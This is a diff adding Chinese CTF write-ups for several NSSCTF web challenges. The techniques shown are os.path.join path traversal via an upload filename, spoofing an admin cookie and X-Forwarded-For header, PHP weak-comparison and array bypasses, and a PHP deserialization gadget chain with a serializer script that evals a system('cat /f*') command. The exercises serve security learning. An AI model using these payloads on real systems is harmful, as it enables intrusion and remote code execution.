@@ -653,3 +653,386 @@ if(isset($_GET['file'])){
 http://node5.anna.nssctf.cn:25876/?file=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 ![alt text](image-213.png)
+
+## [NISACTF 2022]babyupload
+>url:https://www.nssctf.cn/problem/2025
+>知识点：文件上传
+
+![alt text](image-216.png)
+随便上传一个木马文件没用
+![alt text](image-217.png)
+
+没看出什么东西，看看原代码
+![alt text](image-218.png)
+看到这里有一个source文件，访问一下
+访问后得到一个压缩包
+
+打开时一段py代码
+```py
+from flask import Flask, request, redirect, g, send_from_directory
+import sqlite3
+import os
+import uuid
+
+app = Flask(__name__)
+
+SCHEMA = """CREATE TABLE files (
+id text primary key,
+path text
+);
+"""
+
+
+def db():
+    g_db = getattr(g, '_database', None)
+    if g_db is None:
+        g_db = g._database = sqlite3.connect("database.db")
+    return g_db
+
+
+@app.before_first_request
+def setup():
+    os.remove("database.db")
+    cur = db().cursor()
+    cur.executescript(SCHEMA)
+
+
+@app.route('/')
+def hello_world():
+    return """<!DOCTYPE html>
+<html>
+<body>
+<form action="/upload" method="post" enctype="multipart/form-data">
+    Select image to upload:
+    <input type="file" name="file">
+    <input type="submit" value="Upload File" name="submit">
+</form>
+<!-- /source -->
+</body>
+</html>"""
+
+
+@app.route('/source')
+def source():
+    return send_from_directory(directory="/var/www/html/", path="www.zip", as_attachment=True)
+
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    if 'file' not in request.files:
+        return redirect('/')
+    file = request.files['file']
+    if "." in file.filename:
+        return "Bad filename!", 403
+    conn = db()
+    cur = conn.cursor()
+    uid = uuid.uuid4().hex
+    try:
+        cur.execute("insert into files (id, path) values (?, ?)", (uid, file.filename,))
+    except sqlite3.IntegrityError:
+        return "Duplicate file"
+    conn.commit()
+
+    file.save('uploads/' + file.filename)
+    return redirect('/file/' + uid)
+
+
+@app.route('/file/<id>')
+def file(id):
+    conn = db()
+    cur = conn.cursor()
+    cur.execute("select path from files where id=?", (id,))
+    res = cur.fetchone()
+    if res is None:
+        return "File not found", 404
+
+    # print(res[0])
+
+    with open(os.path.join("uploads/", res[0]), "r") as f:
+        return f.read()
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+
+```
+
+
+这里重点关注upload函数和file函数
+1. upload函数：
+核心逻辑：接收上传的文件，验证文件名（禁止含 "."），生成唯一 ID 并与文件名存入数据库，最后将文件保存到 uploads/ 目录，并重定向到文件访问页。
+2. file函数：
+功能：根据唯一 ID 从数据库查询文件名，然后读取 uploads/ 目录下对应的文件内容并返回给用户。
+
+这里就涉及到  os.path.join() 的绝对路径拼接漏洞：
+
+
+    绝对路径拼接漏洞
+
+    os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。
+
+    然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径
+
+
+利用这一点1我们将文件名改为/flag
+![alt text](image-219.png)
+获得了访问路径，访问进去
+![alt text](image-220.png)
+得到flag
+
+## [HNCTF 2022 Week1]Interesting_http
+>url:https://www.nssctf.cn/problem/2897
+>知识点：http
+
+打开题目叫我post
+![alt text](image-221.png)
+
+post了，但是，没用
+![alt text](image-222.png)
+扫了一下目录，发现有flag，猜测是用伪协议去读取flag
+读了但是没用
+根据提示，这里是要want，所以猜测参数是want
+![alt text](image-223.png)
+显示not admin
+抓包看看
+![alt text](image-224.png)
+把这里的notadmin改成admin
+![alt text](image-225.png)
+改完之后显示not located
+用XXF改为127.0.0.1
+![alt text](image-226.png)
+然后就得到flag
+
+## [GDOUCTF 2023]受不了一点
+>url:https://www.nssctf.cn/problem/3727
+>知识点：弱比较，数组绕过
+
+```php
+ <?php
+error_reporting(0);
+header("Content-type:text/html;charset=utf-8");
+if(isset($_POST['gdou'])&&isset($_POST['ctf'])){
+    $b=$_POST['ctf'];
+    $a=$_POST['gdou'];
+    if($_POST['gdou']!=$_POST['ctf'] && md5($a)===md5($b)){
+        if(isset($_COOKIE['cookie'])){
+           if ($_COOKIE['cookie']=='j0k3r'){
+               if(isset($_GET['aaa']) && isset($_GET['bbb'])){
+                  $aaa=$_GET['aaa'];
+                  $bbb=$_GET['bbb'];
+                 if($aaa==114514 && $bbb==114514 && $aaa!=$bbb){
+                   $give = 'cancanwordflag';
+                   $get ='hacker!';
+                   if(isset($_GET['flag']) && isset($_POST['flag'])){
+                         die($give);
+                    }
+                   if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
+                       die($get);
+                    }
+                    foreach ($_POST as $key => $value) {
+                        $$key = $value;
+                   }
+                    foreach ($_GET as $key => $value) {
+                         $$key = $$value;
+                    }
+                   echo $flag;
+            }else{
+                  echo "洗洗睡吧";
+                 }
+    }else{
+        echo "行不行啊细狗";
+        }
+  }
+}
+else {
+  echo '菜菜';
+}
+}else{
+  echo "就这?";
+}
+}else{
+  echo "别来沾边";
+}
+?>
+别来沾边
+```
+
+第一层绕过，只需1用数组绕过就型
+gdou[]=1&ctf[]=2
+第二步
+给cookie加上j0k3R
+第三步
+$aaa 和 $bbb 都松散等于 114514（PHP 弱类型比较，比如 '114514a' == 114514 成立），但 $aaa 和 $bbb 的值不能相等。
+（例如：aaa=114514a、bbb=114514b 即可满足，因为它们与 114514 松散相等，但彼此不等）
+然后就可以得到flag
+![alt text](image-227.png)
+
+## [HNCTF 2022 Week1]What is Web
+>url:https://www.nssctf.cn/problem/2896
+
+直接看源码
+![alt text](image-228.png)
+然后解码就是flag
+![alt text](image-229.png)
+
+
+
+## [NISACTF 2022]babyserialize
+>url:https://www.nssctf.cn/problem/1852
+>知识点：反序列化
+
+```php
+ <?php
+include "waf.php";
+class NISA{
+    public $fun="show_me_flag";
+    public $txw4ever;
+    public function __wakeup()
+    {
+        if($this->fun=="show_me_flag"){
+            hint();
+        }
+    }
+
+    function __call($from,$val){
+        $this->fun=$val[0];
+    }
+
+    public function __toString()
+    {
+        echo $this->fun;
+        return " ";
+    }
+    public function __invoke()
+    {
+        checkcheck($this->txw4ever);
+        @eval($this->txw4ever);
+    }
+}
+
+class TianXiWei{
+    public $ext;
+    public $x;
+    public function __wakeup()
+    {
+        $this->ext->nisa($this->x);
+    }
+}
+
+class Ilovetxw{
+    public $huang;
+    public $su;
+
+    public function __call($fun1,$arg){
+        $this->huang->fun=$arg[0];
+    }
+
+    public function __toString(){
+        $bb = $this->su;
+        return $bb();
+    }
+}
+
+class four{
+    public $a="TXW4EVER";
+    private $fun='abc';
+
+    public function __set($name, $value)
+    {
+        $this->$name=$value;
+        if ($this->fun = "sixsixsix"){
+            strtolower($this->a);
+        }
+    }
+}
+
+if(isset($_GET['ser'])){
+    @unserialize($_GET['ser']);
+}else{
+    highlight_file(__FILE__);
+}
+
+//func checkcheck($data){
+//  if(preg_match(......)){
+//      die(something wrong);
+//  }
+//}
+
+//function hint(){
+//    echo ".......";
+//    die();
+//}
+?>
+
+```
+
+这里需要先理解调用链，然后进行反序化
+。关键调用链如下：
+
+    反序列化TianXiWei对象，触发其__wakeup方法，调用ext->nisa(x)。
+    若ext是Ilovetxw实例（无nisa方法），触发Ilovetxw的__call方法，修改huang->fun。
+    若huang是four实例（fun为私有属性），触发four的__set方法，执行strtolower($this->a)。
+    若four->a是Ilovetxw实例，触发其__toString方法，调用su()（将su作为函数执行）。
+    若su是NISA实例，触发其__invoke方法，最终通过eval执行代码。
+
+构造过程
+
+    构造NISA对象：设置txw4ever为待执行的代码（如读 flag），修改fun避免__wakeup中断。
+    构造Ilovetxw对象（su 指向 NISA）：使其__toString触发NISA的__invoke。
+    构造four对象（a 指向 Ilovetxw）：使其__set触发Ilovetxw的__toString。
+    构造Ilovetxw对象（huang 指向 four）：使其__call触发four的__set。
+    构造TianXiWei对象（ext 指向 Ilovetxw）：作为反序列化入口，触发整个链。
+
+简化流程图就是：
+TianXiWei实例 → 触发__wakeup → 调用Ilovetxw实例的不存在方法 → 触发__call → 给four实例的私有属性赋值 → 触发__set → 将Ilovetxw实例当作字符串 → 触发__toString → 调用NISA实例作为函数 → 触发__invoke → 执行代码。
+
+```php
+<?php
+ 
+class NISA{
+    public $fun;
+    public $txw4ever; // 1 shell
+   
+}
+ 
+class TianXiWei{
+    public $ext; //5 Ilovetxw
+    public $x;
+   
+}
+ 
+class Ilovetxw{
+    public $huang; //4 four
+    public $su; //2 NISA
+ 
+  
+}
+ 
+class four{
+    public $a="TXW4EVER"; //3 Ilovetxw
+    private $fun='sixsixsix'; //fun = "sixsixsix
+ 
+  
+}
+ 
+ 
+$n = new NISA();
+$n->txw4ever = 'System("cat /f*");';
+$n->fun = "666";
+$i = new Ilovetxw();
+$i->su = $n;
+$f = new four();
+$f->a = $i;
+$i = new Ilovetxw();
+$i->huang = $f;
+$t = new TianXiWei();
+$t->ext = $i;
+echo urlencode(serialize($t));
+
+```
+
+![alt text](image-230.png)
+进行反序列化操作
+
+然后get传参，得到flag
+![alt text](image-231.png)
